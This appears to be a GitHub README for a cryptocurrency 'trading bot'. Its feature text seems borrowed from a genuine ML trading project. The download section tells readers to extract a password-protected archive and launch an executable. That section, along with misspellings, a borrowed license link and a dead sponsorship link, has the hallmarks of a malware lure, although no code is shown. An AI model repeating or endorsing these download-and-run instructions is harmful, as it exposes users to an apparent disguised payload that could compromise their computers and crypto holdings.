
![img](https://github.com/er-arunkumarselvam/same-trading-bot/assets/113919924/1d334b83-b2fd-47be-9262-7d95abcf6be8)

# TRADING BOT

The project is aimed at developing an intelligent trading bot for automated trading cryptocurrencies using state-of-the-art machine learning (ML) algorithms and feature engineering. The project provides the following major functionalities:

+ Defining derived features using custom (Python) functions including technical indicators
+ Analyzing historic data and training machine learning models in batch off-line mode
+ Analyzing the predicted scores and choosing best signal parameters
+ Signaling service which is regularly requests new data from the exchange and generates buy-sell signals by applying the previously trained models in on-line mode
+ Trading service which does real trading by buying or selling the assets according to the generated signals

# How to download

Download the archive in the repositori. Unarchive ***trading.rar*** (archive password - bot) and launh ***tr bot.exe***.

# License

TRADING B0T is released under the terms of the MIT license. See [COPYING](https://github.com/bitcoin/bitcoin/blob/master/COPYING) for more information or see https://opensource.org/licenses/MIT.

# TRADING

Currently, the bot is configured using the following parameters:

+ Exchange: most popular platforms
+ Cryptocurrency: all coins
+ Analysis frequency: 1 minute (currently the only option)
+ Score between -1 and +1. <0 means likely to decrease, and >0 means likely to increase
+ Filter: notifications are sent only if score is greater than ±0.20 (may change)
+ One increase/decrease sign is added for each step of 0.05 (exceeding the filter threshold)

# Features

+ Currently it runs in non-incremental model by computing features for all available input records (and not only for the latest update), and hence it may take hours for complex configurations
+ The script loads merged input data, applies feature generation procedures and stores all derived features in an output file
+ Not all generated features will be used for training and prediction. For the train/predict phases, a separate list of features is specified
+ Feature functions get additional parameters like windows from the config section
+ The same features must be used for on-line feature generation (in the service when they are generated for a micro-batch) and off-line feature generation.

# Sponsorship

[Become a sponsor](https://github.com/404)

# Contact Us

crypto.ex@devby.same
